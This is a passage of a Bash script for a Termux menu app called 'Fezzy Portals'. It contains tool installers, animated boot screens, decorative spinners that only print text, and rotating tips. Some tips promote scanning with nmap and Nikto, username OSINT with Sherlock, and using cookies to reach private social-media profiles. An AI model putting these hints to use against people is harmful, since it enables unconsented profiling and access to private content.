        tools)     _stamp "OPERATION COMPLETE · BASE CLEAN" "${C6}" ;;
        juicewrld) _stamp "999 · SEALED · LEGENDS NEVER DIE" "${C7}" ;;
        social)    _stamp "GHOST MODE · NO TRACE LEFT" "${C8}" ;;
        fileorg)   _stamp "VAULT SORTED · CLEAN OPERATION" "${C9}" ;;
        books)     _stamp "LIBRARY UPDATED · KNOWLEDGE LOCKED" "${C10}" ;;
        hacker)    _stamp "GHOST MODE · NO TRACE LEFT" "${C11}" ;;
        pdf)       _stamp "DOCUMENT SEALED · SURGEON DONE" "${C12}" ;;
        docs)      _stamp "FILE LOCKED · STRATEGY SAVED" "${C13}" ;;
        android)   _stamp "BRIDGE ACTIVE · SIGNAL CONFIRMED" "${C14}" ;;
        downloads) _stamp "PULL COMPLETE · SILENT OPERATION" "${C15}" ;;
        clipboard) _stamp "SAVED · NOTHING GETS LOST" "${C16}" ;;
        notifs)    _stamp "DELIVERED · BOJACK BARKED ONCE" "${C17}" ;;
        research)  _stamp "INTEL LOCKED · SAVED TO PHONE" "${C18}" ;;
        github)    _stamp "REPO LOCKED · PHILFESTERS LIVE" "${C19}" ;;
        news)      _stamp "INFORMED · CAPE TOWN · SOI LIVE" "${C20}" ;;
        fezzysec)  _stamp "SECURE · 999 · SOI PROTOCOL ACTIVE" "${C20}" ;;
        fezzyhacker) _stamp "RECON COMPLETE · NO TRACE LEFT · 999" "${C21}" ;;
        foss)        _stamp "FOSS LOADED · OPEN SOURCE WINS · 999" "${C27}" ;;
        termuxenc)   _stamp "KNOWLEDGE LOCKED · TERMUX MASTERED" "${C28}" ;;
        fezzyartist) _stamp "GRANT FEZZY · CPT · STRATEGY OVER IMPULSE · 999" "${C29}" ;;
        musicplayer) _stamp "PLAYING · FREQUENCY LOCKED · 999" "${C30}" ;;
        *)         _stamp "OPERATION COMPLETE · SOI" "${GRN}" ;;
    esac
}

# ── SOI CYCLE — cycling phrases during long ops ───────────────────
_soi_cycle() {
    local duration="${1:-3}" col="${2:-${FADE}}"
    local phrases=(
        "Strategy Over Impulse — think before you pull..."
        "Move in silence · let the downloads speak..."
        "999 — what goes up never comes down..."
        "Appear weak when strong · appear strong when downloading..."
        "The operation unseen is the operation that succeeds..."
        "Every pull is a statement · make it count..."
        "Supreme excellence — pulling before they knew you were there..."
        "Build the archive quietly · they never notice it growing..."
    )
    local start; start=$(date +%s)
    local i=0
    while true; do
        local now; now=$(date +%s)
        (( now - start >= duration )) && break
        printf "\r  ${col}%-70s${RESET}" "${phrases[$((i % ${#phrases[@]}))]}"
        sleep 1.2
        ((i++))
    done 2>/dev/null
    printf "\r%-72s\r" " "
}

# ── PORTAL ENTRY — slide-in animation ────────────────────────────
_portal_entry() {
    local name="$1" col="${2:-${PINK}}"
    local line="  ▶  ENTERING ${name^^}  ·  SOI  ·  999"
    local len=${#line}
    for ((i=1; i<=len; i++)); do
        printf "\r${col}${BOLD}%s${RESET}" "${line:0:$i}"
        sleep 0.007
    done 2>/dev/null
    printf "\r%-${len}s\r" " "
}

# ── HOVER HINTS — rotates per portal ─────────────────────────────
_hover_hint() {
    local portal="$1"
    local hint=""
    case "$portal" in
        gallery)   local hints=("gallery-dl pulls entire pages in one command" "Add cookies.txt to unlock private content" "Use [12] for bulk Instagram drains"); hint="${hints[$((RANDOM%3))]}" ;;
        music)     local hints=("--embed-thumbnail bakes artwork into the MP3" "Use [9] for bulk URL lists" "SoundCloud links work best with yt-dlp"); hint="${hints[$((RANDOM%3))]}" ;;
        video)     local hints=("Use [9] Format Presets for quick 1080p pulls" "Cookies unlock private Instagram reels" "TikTok works without cookies"); hint="${hints[$((RANDOM%3))]}" ;;
        webgrab)   local hints=("HTTrack mirrors entire sites offline" "Use wget -r for simple recursive grabs" "Great for archiving before sites go down"); hint="${hints[$((RANDOM%3))]}" ;;
        search)    local hints=("16 sources loaded simultaneously" "iTunes API pulls clean metadata" "Archive.org holds files others deleted"); hint="${hints[$((RANDOM%3))]}" ;;
        tools)     local hints=("ncdu shows exactly what's eating storage" "yt-dlp updates fix broken sites fast" "Cache clean frees space instantly"); hint="${hints[$((RANDOM%3))]}" ;;
        juicewrld) local hints=("Search 'Juice WRLD grail' for rarest pulls" "999 Club on YouTube has deep vault content" "SoundCloud has early mixtape era tracks"); hint="${hints[$((RANDOM%3))]}" ;;
        social)    local hints=("Sherlock checks 300+ platforms at once" "Save reports to ~/storage/downloads/social" "Cookie auth cracks private profiles"); hint="${hints[$((RANDOM%3))]}" ;;
        fileorg)   local hints=("OCR extracts text from image screenshots" "Duplicate finder saves storage fast" "EXIF strip removes location data from photos"); hint="${hints[$((RANDOM%3))]}" ;;
        books)     local hints=("Gutenberg has 70,000+ free books" "Standard Ebooks has clean formatted versions" "Use EPUB for best reading experience"); hint="${hints[$((RANDOM%3))]}" ;;
        hacker)    local hints=("nmap -sV for service version detection" "Sherlock + Maigret for username OSINT" "Save all reports to ~/storage/downloads/hacker_reports"); hint="${hints[$((RANDOM%3))]}" ;;
        pdf)       local hints=("OCR makes scanned PDFs searchable" "Compress before sending — saves bandwidth" "Merge multiple reports into one file"); hint="${hints[$((RANDOM%3))]}" ;;
        docs)      local hints=("Export notes as PDF, TXT or HTML" "Write mode saves directly to sdcard" "Use bookmarks to save important URLs"); hint="${hints[$((RANDOM%3))]}" ;;
        android)   local hints=("termux-api must be installed + F-Droid app" "Scheduled SMS works with at command" "WiFi scan shows all nearby networks"); hint="${hints[$((RANDOM%3))]}" ;;
        downloads) local hints=("aria2c supports multi-thread downloads" "Pause and resume large files safely" "Queue multiple URLs and walk away"); hint="${hints[$((RANDOM%3))]}" ;;
        clipboard) local hints=("Categories keep your clips organised" "Search finds saved clips instantly" "Nothing gets lost in the clipboard vault"); hint="${hints[$((RANDOM%3))]}" ;;
        notifs)    local hints=("Ongoing notifications persist after reboot" "Scheduled alerts use termux-wake-lock" "Custom sound notifications wake the screen"); hint="${hints[$((RANDOM%3))]}" ;;
        research)  local hints=("All results save to ~/storage/downloads/research" "Multi-search hits all sources at once" "Wikipedia pulls full article text"); hint="${hints[$((RANDOM%3))]}" ;;
        github)    local hints=("Set your token once with [T] — persists sessions" "Clone any public repo without token" "philfesters repos load automatically"); hint="${hints[$((RANDOM%3))]}" ;;
        news)      local hints=("w3m opens articles inside Termux terminal" "Save headlines to ~/storage/downloads/fezzy_news" "Load shedding: pkg install curl then option 15"); hint="${hints[$((RANDOM%3))]}" ;;
        fezzysec)  local hints=("w3m opens articles inside Termux terminal" "Save headlines to ~/storage/downloads/fezzy_news" "Load shedding status via loadshedding.co.za"); hint="${hints[$((RANDOM%3))]}" ;;
        fezzyhacker) local hints=("Nikto scans web servers for known vulnerabilities" "Run recon passively before any active scan" "Save all reports to ~/storage/downloads/hacker_reports"); hint="${hints[$((RANDOM%3))]}" ;;
        foss)        local hints=("F-Droid has 3,800+ fully open source apps" "Obtainium installs direct from GitHub releases" "Aurora Store gives anonymous Play Store access"); hint="${hints[$((RANDOM%3))]}" ;;
        termuxenc)   local hints=("Type any keyword to search all categories" "Random tip shows one useful command instantly" "Add your own commands to Custom category [13]"); hint="${hints[$((RANDOM%3))]}" ;;
        fezzyartist) local hints=("yt-dlp pulls SoundCloud tracks direct to storage" "YouTube vlogs download best with --format bestvideo+bestaudio" "mpv plays downloaded tracks without leaving terminal"); hint="${hints[$((RANDOM%3))]}" ;;
        musicplayer) local hints=("mpv plays audio directly in Termux terminal" "Background mode lets music run while you work" "Create .m3u playlists to save your sessions"); hint="${hints[$((RANDOM%3))]}" ;;
        *) hint="Strategy Over Impulse — think before you pull" ;;
    esac
    printf "  ${FADE}💡 %s${RESET}\n" "$hint"
}

# ── IDLE QUOTE — fades in on main menu ───────────────────────────
_idle_quote() {
    local q; q=$(_soi_quote)
    local len=${#q}
    printf "  ${FADE}"
    for ((i=0; i<len; i++)); do
        printf "%s" "${q:$i:1}"; sleep 0.011
    done 2>/dev/null
    printf "${RESET}\n"
}

# 
# INSTALL HUB — optional tools installer, loops back on completion
# 
_install_hub() {
    while true; do
        clear
        echo ""
        printf "${RED}${BOLD}"
        printf "  ╔══════════════════════════════════════════════════════════╗\n"
        printf "  ║          FEZZY PORTALS  ·  INSTALL HUB  ·  SOI         ║\n"
        printf "  ╚══════════════════════════════════════════════════════════╝\n"
        printf "${RESET}"
        echo ""
        printf "  ${RED}⚠  Install tools before entering portals or they will break.${RESET}\n"
        echo ""
        _red_bar
        echo ""
        printf "  ${YEL}${BOLD}[1]${RESET}  ${WH}yt-dlp              ${FADE}— YouTube / audio downloader${RESET}\n"
        printf "  ${YEL}${BOLD}[2]${RESET}  ${WH}gallery-dl          ${FADE}— bulk image/gallery downloader${RESET}\n"
        printf "  ${YEL}${BOLD}[3]${RESET}  ${WH}ffmpeg              ${FADE}— media converter (required by yt-dlp)${RESET}\n"
        printf "  ${YEL}${BOLD}[4]${RESET}  ${WH}PDF Tools (poppler) ${FADE}— pdftotext, pdfinfo, PDF handling${RESET}\n"
        printf "  ${YEL}${BOLD}[5]${RESET}  ${WH}ranger              ${FADE}— terminal file manager${RESET}\n"
        printf "  ${YEL}${BOLD}[6]${RESET}  ${WH}htop                ${FADE}— process monitor${RESET}\n"
        printf "  ${YEL}${BOLD}[7]${RESET}  ${WH}Termux API          ${FADE}— Android bridge (needs F-Droid app too)${RESET}\n"
        printf "  ${YEL}${BOLD}[8]${RESET}  ${WH}w3m                 ${FADE}— terminal browser (news portal viewer)${RESET}\n"
        printf "  ${YEL}${BOLD}[9]${RESET}  ${WH}mpv                 ${FADE}— media player (radio streams)${RESET}\n"
        printf "  ${YEL}${BOLD}[10]${RESET} ${WH}Termux-X11          ${FADE}— graphical environment (Wayland/X11 support)${RESET}\n"
        printf "  ${YEL}${BOLD}[0]${RESET}  ${RED}${BOLD}INSTALL ALL         ${FADE}— installs everything above${RESET}\n"
        echo ""
        _red_bar
        echo ""
        printf "  ${FADE}[m] Main Menu   [b] Boot Screen   [q] Quit${RESET}\n"
        echo ""
        printf "  ${YEL}${BOLD}Choice » ${RESET}"
        read -r ins_ch

        case "$ins_ch" in
            1)
                echo ""
                printf "  ${YEL}Installing yt-dlp...${RESET}\n"
                pip install yt-dlp --break-system-packages
                echo ""; printf "  ${GRN}✓ Done.${RESET}\n"
                ;;
            2)
                echo ""
                printf "  ${YEL}Installing gallery-dl...${RESET}\n"
                pip install gallery-dl --break-system-packages
                echo ""; printf "  ${GRN}✓ Done.${RESET}\n"
                ;;
            3)
                echo ""
                printf "  ${YEL}Installing ffmpeg...${RESET}\n"
                pkg install ffmpeg -y
                echo ""; printf "  ${GRN}✓ Done.${RESET}\n"
                ;;
            4)
                echo ""
                printf "  ${YEL}Installing PDF Tools (poppler)...${RESET}\n"
                pkg install poppler -y
                echo ""; printf "  ${GRN}✓ Done.${RESET}\n"
                ;;
            5)
                echo ""
                printf "  ${YEL}Installing ranger...${RESET}\n"
                pkg install ranger -y
                echo ""; printf "  ${GRN}✓ Done.${RESET}\n"
                ;;
            6)
                echo ""
                printf "  ${YEL}Installing htop...${RESET}\n"
                pkg install htop -y
                echo ""; printf "  ${GRN}✓ Done.${RESET}\n"
                ;;
            7)
                echo ""
                printf "  ${YEL}Installing Termux API...${RESET}\n"
                pkg install termux-api -y
                printf "  ${FADE}Remember: also install Termux:API from F-Droid.${RESET}\n"
                echo ""; printf "  ${GRN}✓ Done.${RESET}\n"
                ;;
            8)
                echo ""
                printf "  ${YEL}Installing w3m...${RESET}\n"
                pkg install w3m -y
                echo ""; printf "  ${GRN}✓ Done.${RESET}\n"
                ;;
            9)
                echo ""
                printf "  ${YEL}Installing mpv...${RESET}\n"
                pkg install mpv -y
                echo ""; printf "  ${GRN}✓ Done.${RESET}\n"
                ;;
            10)
                echo ""
                printf "  ${YEL}Installing Termux-X11...${RESET}\n"
                pkg install x11-repo -y
                pkg install termux-x11-nightly -y
                printf "  ${FADE}Note: Also download Termux-X11 APK from GitHub releases.${RESET}\n"
                echo ""; printf "  ${GRN}✓ Done.${RESET}\n"
                ;;
            0)
                echo ""
                printf "  ${RED}${BOLD}Installing ALL tools...${RESET}\n\n"
                pkg install x11-repo -y
                pkg install ffmpeg poppler ranger htop termux-api w3m mpv termux-x11-nightly -y
                pip install yt-dlp gallery-dl --break-system-packages
                echo ""
                printf "  ${GRN}${BOLD}✓ All tools installed.${RESET}\n"
                printf "  ${FADE}Note: Download Termux-X11 APK from GitHub for graphical apps.${RESET}\n"
                ;;
            m|M) media_station_portal; return ;;
            b|B) return ;;
            q|Q) exit 0 ;;
            *)
                printf "  ${RED}Invalid choice${RESET}\n"; sleep 0.5; continue ;;
        esac

        echo ""
        printf "  ${GRN}✓ Installation complete.${RESET}\n"
        printf "  ${FADE}Choose another tool, or [m]/[b]/[q] to navigate.${RESET}\n"
        echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
    done
}

# 
# BOOT SEQUENCE — runs once per session
# 
_FEZZY_BOOTED=0

# ═══════════════════════════════════════════════════════════════════
#  FEZZY PRE-FLIGHT · ADMIN FEZZY · INTOXICATED FEZZY · SOI · 999
# ═══════════════════════════════════════════════════════════════════
_uzi_preflight() {

    # Neon purple divider — mirrors Bojack _dvf exactly, same ═ char, different colour
    _dvfz() { local _dw; _dw=$(tput cols 2>/dev/null||echo 88); printf "${PU2}"; printf "%${_dw}s" "" | tr ' ' '═'; printf "${RESET}\n"; }

    clear
    echo ""

    # ── FEZZY ASCII — HOT→PINK→CY, mirrors Bojack single-colour structure ──
    printf "${HOT}${BOLD}"
    printf "  ███████╗███████╗███████╗███████╗██╗   ██╗\n"
    printf "  ██╔════╝██╔════╝╚══███╔╝╚══███╔╝╚██╗ ██╔╝\n"
    printf "${RESET}${PINK}${BOLD}"
    printf "  █████╗  █████╗    ███╔╝   ███╔╝  ╚████╔╝ \n"
    printf "  ██╔══╝  ██╔══╝   ███╔╝   ███╔╝    ╚██╔╝  \n"
    printf "${RESET}${CY}${BOLD}"
    printf "  ██║     ███████╗███████╗███████╗   ██║    \n"
    printf "  ╚═╝     ╚══════╝╚══════╝╚══════╝   ╚═╝    \n"
    printf "${RESET}"
    echo ""

    # Mirrors Bojack: glitch + decipher + fade line
    _glitch_line "F E Z Z Y   P O R T A L S  ·  S T R A T E G Y   O V E R   I M P U L S E  ·  999" "${PINK}"
    _decipher_line "Ravensmead · Cape Town · philfesters · 30 portals · Android 14" "${FADE}"
    printf "  ${FADE}Private · Open Source · Rootless · Strategy Over Impulse · 999${RESET}\n"
    echo ""
    _dvfz
    echo ""

    # Mirrors Bojack: time greeting (pink) + SOI quote (white)
    printf "  ${PINK}$(_time_greeting)${RESET}\n"
    echo ""
    printf "  ${WH}%s${RESET}\n" "$(_soi_quote)"
    echo ""
    _dvfz
    echo ""

    # Mirrors Bojack spinners — street talk, slightly faster
    _spin "Fezzy entering the frequency" 0.35 "${PINK}"
    _spin "Loading street talk protocol" 0.28 "${FADE}"
    _spin "Calibrating 30 portal nodes" 0.35 "${CY}"
    _spin "Fezzy on the wire — signal confirmed" 0.28 "${FADE}"
    _spin "SOI handshake complete — dropping in" 0.32 "${HOT}"
    echo ""
    _dvfz
    echo ""

    # Mirrors Bojack loading section: ADMIN FEZZY header + synopsis
    printf "  ${PINK}${BOLD}◈  A D M I N   F E Z Z Y   —   S T R A T E G I C   O P S${RESET}\n"
    echo ""
    printf "  ${PINK}◈${RESET}  ${WH}Aye — this ain't a script, this is a whole operation.${RESET}\n"
    sleep 0.22
    printf "  ${PINK}◈${RESET}  ${WH}30 portals running rootless on one device — no root, no team.${RESET}\n"
    sleep 0.22
    printf "  ${PINK}◈${RESET}  ${WH}Gallery · music · proxychains · hacking tools — built different.${RESET}\n"
    sleep 0.22
    printf "  ${PINK}◈${RESET}  ${WH}Bojack on the perimeter, Fezzy in the system — 999. Always.${RESET}\n"
    sleep 0.22
    printf "  ${PINK}◈${RESET}  ${WH}Strategy Over Impulse — Ravensmead to the whole world.${RESET}\n"
    echo ""
    _dvfz
    echo ""

    # Mirrors Bojack portal section: INTOXICATED FEZZY header + synopsis (white text)
    printf "  ${CY}${BOLD}◈  I N T O X I C A T E D   F E Z Z Y   —   O F F   T H E   W I R E${RESET}\n"
    echo ""
    printf "  ${CY}◈${RESET}  ${WH}Going through portals not feelings — new mode unlocked.${RESET}\n"
    sleep 0.12
    printf "  ${CY}◈${RESET}  ${WH}30 levels deep and still climbing — moving through dimensions.${RESET}\n"
    sleep 0.12
    printf "  ${CY}◈${RESET}  ${WH}XO to the script — it carries me when everything goes dark.${RESET}\n"
    sleep 0.12
    printf "  ${CY}◈${RESET}  ${WH}Eternal Atake got me escaping through every portal like smoke.${RESET}\n"
    sleep 0.12
    printf "  ${CY}◈${RESET}  ${WH}The plug is the script, the script is the plug — 999.${RESET}\n"
    echo ""
    _dvfz
    echo ""

    # Mirrors Bojack countdown section: PORTAL INSTALLATION TOOLS CHECK
    printf "  ${PINK}${BOLD}◈  P O R T A L   I N S T A L L A T I O N   T O O L S   C H E C K${RESET}\n"
    echo ""

    # Skip-if-healthy — pink, visually separate
    local _pf_healthy=1 _pf_skip=0
    local _ck_tools=("ffmpeg" "yt-dlp" "mpv" "socat" "curl" "git" "python3" "nmap")
    for _t in "${_ck_tools[@]}"; do
        command -v "$_t" &>/dev/null || { _pf_healthy=0; break; }
    done

    if [[ $_pf_healthy -eq 1 ]]; then
        printf "  ${PINK}${BOLD}[ S ]  Skip — environment healthy · all tools on the wire${RESET}\n"
        printf "  ${FADE}[ ENTER ]  Run full check anyway${RESET}\n\n"
        printf "  ${PINK}${BOLD}» ${RESET}"; read -r _skip_ch
        [[ "${_skip_ch,,}" == "s" ]] && _pf_skip=1
        echo ""
    fi

    if [[ $_pf_skip -eq 0 ]]; then
        # ── LIVE TASK SPINNER — available for all Q1/Q2/Q3 blocks ────
        _pf_spin() {
            local pid=$1 label=$2
            local sp=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏") si=0
            while kill -0 "$pid" 2>/dev/null; do
                printf "\r  ${GRN}%s${RESET}  ${WH}%s${RESET}    " "${sp[$((si%10))]}" "$label"
                (( si++ )); sleep 0.1
            done
            printf "\r  ${GRN}✔${RESET}  ${WH}%-52s${RESET}\n" "$label"
        }
        printf "  ${WH}[y] yes  ·  [n] no  — we handle it, then drop you in${RESET}\n"
        echo ""

        # Q1
        printf "  ${GRN}${BOLD}[1/4]  Purge dead cache + broken deps?${RESET}\n"
        printf "  ${FADE}         /tmp fezzy files · apt autoremove · pkg clean${RESET}\n\n"
        printf "  ${PINK}${BOLD}[y] Yes   [n] No${RESET}  ›  "; read -r _pf1; echo ""
        if [[ "${_pf1,,}" == "y" || "${_pf1,,}" == "yes" ]]; then
            printf "  ${FADE}── CLEANUP ─────────────────────────────────────────────${RESET}\n\n"
            (rm -rf "${TMPDIR:-/tmp}"/fezzy_* 2>/dev/null) &
            _pf_spin $! "Purging /tmp fezzy files"
            (apt autoremove -y &>/dev/null) &
            _pf_spin $! "Removing unused packages"
            (pkg clean &>/dev/null) &
            _pf_spin $! "Cleaning package cache"
            echo ""
            printf "  ${GRN}✔  Cache gone · system breathing · SOI${RESET}\n\n"
        else
            printf "  ${WH}  skipped · cold blood · moving${RESET}\n\n"
        fi

        # Q2
        printf "  ${GRN}${BOLD}[2/4]  Sweep empty folders in downloads?${RESET}\n"
        printf "  ${FADE}         finds + removes dead dirs in ~/storage/downloads${RESET}\n\n"
        printf "  ${PINK}${BOLD}[y] Yes   [n] No${RESET}  ›  "; read -r _pf2; echo ""
        if [[ "${_pf2,,}" == "y" || "${_pf2,,}" == "yes" ]]; then
            printf "  ${FADE}── SWEEP ───────────────────────────────────────────────${RESET}\n\n"
            local _removed=0
            local _sweep_done=0
            (
                while IFS= read -r -d '' _ed; do
                    rmdir "$_ed" 2>/dev/null && (( _removed++ ))
                done < <(find ~/storage/downloads -mindepth 1 -maxdepth 4 -type d -empty -print0 2>/dev/null)
                echo "$_removed" > "${TMPDIR:-/tmp}/fezzy_sweep_count.txt"
            ) &
            _pf_spin $! "Sweeping empty folders in downloads"
            local _rc=0
            [[ -f "${TMPDIR:-/tmp}/fezzy_sweep_count.txt" ]] && _rc=$(cat "${TMPDIR:-/tmp}/fezzy_sweep_count.txt" 2>/dev/null)
            rm -f "${TMPDIR:-/tmp}/fezzy_sweep_count.txt" 2>/dev/null
            echo ""
            printf "  ${GRN}✔  %s empty folders cleared · cleaner than ever${RESET}\n\n" "${_rc:-0}"
        else
            printf "  ${WH}  skipped · left it · respect${RESET}\n\n"
        fi

        # Q3
        printf "  ${GRN}${BOLD}[3/4]  Install any missing tools?${RESET}\n"
        printf "  ${FADE}         ffmpeg · yt-dlp · mpv · socat · curl · git · python3 · nmap${RESET}\n\n"
        printf "  ${PINK}${BOLD}[y] Yes   [n] No${RESET}  ›  "; read -r _pf3; echo ""
        if [[ "${_pf3,,}" == "y" || "${_pf3,,}" == "yes" ]]; then
            local _inst_tools=("ffmpeg" "yt-dlp" "mpv" "socat" "curl" "git" "python3" "nmap" "proxychains-ng")
            local _missing=()
            for _t in "${_inst_tools[@]}"; do
                command -v "$_t" &>/dev/null || _missing+=("$_t")
            done
            if [[ ${#_missing[@]} -eq 0 ]]; then
                printf "  ${GRN}✔  All tools on the wire · Fezzy stacked · nothing missing${RESET}\n\n"
            else
                printf "  ${FADE}── ENVIRONMENT ─────────────────────────────────────────${RESET}\n\n"
                printf "  ${YEL}  missing: %s${RESET}\n\n" "${_missing[*]}"
                (pkg install -y "${_missing[@]}" &>/dev/null) &
                _pf_spin $! "Installing missing packages via pkg"
                # pip tools
                for _pt in "yt-dlp" "gallery-dl"; do
                    if ! command -v "$_pt" &>/dev/null; then
                        (pip install "$_pt" --break-system-packages &>/dev/null) &
                        _pf_spin $! "pip install $_pt"
                    fi
                done
                echo ""
                printf "  ${GRN}✔  Plug dropped · arsenal loaded · 999${RESET}\n\n"
            fi
        else
            printf "  ${WH}  skipped · already dangerous enough${RESET}\n\n"
        fi

        # Q4
        printf "  ${GRN}${BOLD}[4/4]  Check ProxyChains + Tor ghost mode?${RESET}\n"
        printf "  ${FADE}         status check only · no install · pure recon${RESET}\n\n"
        printf "  ${PINK}${BOLD}[y] Yes   [n] No${RESET}  ›  "; read -r _pf4; echo ""
        if [[ "${_pf4,,}" == "y" || "${_pf4,,}" == "yes" ]]; then
            local _px _tr
            command -v proxychains4 &>/dev/null \
                && _px="${GRN}✓ proxychains4 live — ghost mode ready" \
                || _px="${YEL}✗ proxychains not found — [21] to install"
            command -v tor &>/dev/null \
                && _tr="${GRN}✓ tor active — signal routed" \
                || _tr="${YEL}✗ tor not found — pkg install tor"
            printf "  %b${RESET}\n"   "$_px"
            printf "  %b${RESET}\n\n" "$_tr"
        else
            printf "  ${WH}  ghost check skipped · already invisible${RESET}\n\n"
        fi
    fi

    _dvfz
    echo ""

    # Mirrors Bojack dark humor / bottom: decipher glitch transition
    _decipher_line "⚡  Y O U   A R E   A B O U T   T O   E N T E R   F E Z Z Y   P O R T A L S  ⚡" "${CY}"
    echo ""
    printf "  ${HOT}${BOLD}◈  F R E Q U E N C Y   L O C K E D   ·   S O I   ·   9 9 9   ◈${RESET}\n"
    echo ""
    echo ""
    printf "  ${FADE}[ENTER] drop into the portals  ·  SOI  ·  999  ·  always${RESET}\n"
    echo ""
    printf "  ${HOT}${BOLD}» ${RESET}"; read -r _pf_enter
}


_boot_sequence() {
    clear
    echo ""
    printf "${HOT}${BOLD}"
    printf "  ██████╗  ██████╗      ██╗ █████╗  ██████╗██╗  ██╗\n"
    printf "  ██╔══██╗██╔═══██╗     ██║██╔══██╗██╔════╝██║ ██╔╝\n"
    printf "  ██████╔╝██║   ██║     ██║███████║██║     █████╔╝ \n"
    printf "  ██╔══██╗██║   ██║██   ██║██╔══██║██║     ██╔═██╗ \n"
    printf "  ██████╔╝╚██████╔╝╚█████╔╝██║  ██║╚██████╗██║  ██╗\n"
    printf "  ╚═════╝  ╚═════╝  ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
    printf "${RESET}"
    echo ""
    _glitch_line "FEZZY PORTALS  V1 ENHANCED  ·  STRATEGY OVER IMPULSE  ·  999"
    _decipher_line "Ravensmead · Cape Town · philfesters · GFY-LX2P · Android 14" "${FADE}"
    printf "  ${FADE}Built with Claude · Anthropic · Strategy Over Impulse · 999${RESET}\n"
    echo ""
    _dvf
    echo ""
    printf "  ${YEL}$(_time_greeting)${RESET}\n"
    echo ""
    printf "  ${WH}%s${RESET}\n" "$(_soi_quote)"
    echo ""
    _dvf
    echo ""
    
    # Bojack vault unlock sequence — technical spin phase
    _spin "Bojack sniffing the vault combination" 0.5 "${HOT}"
    _spin "Checking kernel entropy pool" 0.4 "${FADE}"
    _spin "Bojack entering 9 9 9" 0.5 "${PINK}"
    _spin "Mounting portal filesystem" 0.4 "${FADE}"
    _spin "Bojack's tail unlocking 30 portals" 0.6 "${CY}"
    _spin "Resolving portal dependency tree" 0.4 "${FADE}"
    _spin "Validating SOI protocol headers" 0.3 "${DIM}"
    _spin "Sealing session environment" 0.3 "${FADE}"
    
    echo ""
    _dvf
    echo ""
    
    # One master loading bar — fills and stays full
    local portals=("Gallery Portal" "Music Portal" "Video Portal" "Web Offline Grab Portal" "Search Portal" "Tools Portal" "Juice WRLD Portal" "Social OSINT Portal" "File Organizer Portal" "Books Portal" "Hacker Portal" "PDF Portal" "Note Editor Portal" "Android Bridge Portal" "Download Manager Portal" "Clipboard Manager Portal" "Notifications Hub Portal" "Research Portal" "GitHub Portal" "News Portal" "Exploitation Portal" "Encryption Portal" "Torrent Portal" "Termux Desktop Portal" "File Manager Portal" "Shortcut Builder Portal" "FOSS App Discovery Portal" "Termux Encyclopedia Portal" "Fezzy Artist Portal" "Local Music Player Portal")
    local barw=40
    printf "  ${PINK}%-16s${RESET}  ${FADE}[${RESET}" "VAULT UNLOCKED"
    for ((i=0; i<barw; i++)); do
        printf "${GRN}█${RESET}"
        sleep 0.007
    done 2>/dev/null
    printf "${FADE}]${RESET}  ${GRN}✓${RESET}\n"
    echo ""
    _dvf
    echo ""
    # Quick spinners — portal names in white, each locks with ✓ on its own line
    local sp=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
    for name in "${portals[@]}"; do
        for ((f=0; f<4; f++)); do
            printf "\r  ${CY}%s${RESET}  ${WH}%s${RESET}    " "${sp[$((f % 10))]}" "$name"
            sleep 0.035
        done 2>/dev/null
        printf "\r  ${GRN}✓${RESET}  ${WH}%-30s${RESET}\n" "$name"
    done
    
    echo ""
    _dvf
    echo ""
    
    # Countdown 3 2 1
    _countdown "ALL PORTALS LOCKED IN"
    
    echo ""
    
    local battery_level=$(_get_battery 2>/dev/null || echo "N/A")
    local battery_status=$(_get_battery_status 2>/dev/null || echo "unknown")
    
    printf "  ${GRN}✓ All 30 portals loaded  ·  Battery: %s  ·  %s${RESET}\n" "$battery_level" "$battery_status"
    echo ""
    
    # Bojack dark humor quote
    local dark_quotes=(
        "Bojack's already inside. You're the one who's late."
        "The vault never forgets. Neither does Bojack. You should worry."
        "30 portals unlocked. Bojack counted twice. Trust issues."
        "Bojack doesn't ask permission. The vault knows better."
        "Strategy Over Impulse. Bojack Over Everything. 999."
        "You're in. Bojack was never out. Think about that."
    )
    local rq="${dark_quotes[$((RANDOM % ${#dark_quotes[@]}))]}"
    printf "  ${FADE}${rq}${RESET}\n"
    echo ""
    _dvf
    echo ""
    echo ""
    echo ""
    printf "  ${HOT}${BOLD}✦  ETERNAL ATAKE  ·  I JUST WANNA ROCK  ·  999  ✦${RESET}\n"
    echo ""
    echo ""
    printf "  ${FADE}[ENTER] Enter Station   [I] Tools Portal → Install Hub${RESET}\n"
    echo ""
    printf "  ${HOT}${BOLD}Choice » ${RESET}"
    read -r boot_choice
    case "${boot_choice,,}" in
        i) tools_portal; return ;;
    esac
    _uzi_preflight
    _FEZZY_BOOTED=1
}

# 
# BOJACK MOOD METER — battery-based personality
# 
_bojack_mood() {
    local pct=0
    if command -v termux-battery-status &>/dev/null; then
        pct=$(timeout 3 timeout 3 termux-battery-status 2>/dev/null | grep -oP '"percentage":\K[0-9]+' | head -1)
        pct=${pct:-0}
    fi
    if   (( pct >= 90 )); then echo "Bojack is THRIVING — ready to nap in peak condition 🐾"
    elif (( pct >= 70 )); then echo "Bojack is HAPPY — tail wag nominal · vault secure · all systems go"
    elif (( pct >= 50 )); then echo "Bojack is ALERT — watching the network · mild concern detected"
    elif (( pct >= 30 )); then echo "Bojack is CAUTIOUS — low energy protocols · conserving snacks"
    elif (( pct >= 20 )); then echo "Bojack is CONCERNED — emergency nap protocols initiated"
    elif (( pct >= 10 )); then echo "Bojack is CRITICAL — plug me in or we're both going down"
    else                        echo "Bojack is HIBERNATING — 0% energy · send kibble immediately"
    fi
}

# 
# K9 SECURITY REPORT — fake scan with Bojack commentary
# 
_k9_security_report() {
    clear
    echo ""
    _dvf
    printf "  ${HOT}${BOLD}K9 SECURITY REPORT  —  Bojack Threat Analysis System${RESET}\n"
    _dvf
    echo ""
    printf "  ${FADE}Initiating canine threat assessment...${RESET}\n"
    echo ""
    _spin "Sniffing network packets" 1.2 "${HOT}"
    _spin "Checking paw prints in /tmp" 0.9 "${PINK}"
    _spin "Cross-referencing bone cache" 0.8 "${CY}"
    _spin "Analysing suspicious squirrels" 1.0 "${GRN}"
    _spin "Tail wag: nominal" 0.7 "${YEL}"
    echo ""
    _dvf
    echo ""
    printf "  ${HOT}BOJACK THREAT REPORT  ·  $(date '+%Y-%m-%d %H:%M:%S')${RESET}\n"
    echo ""
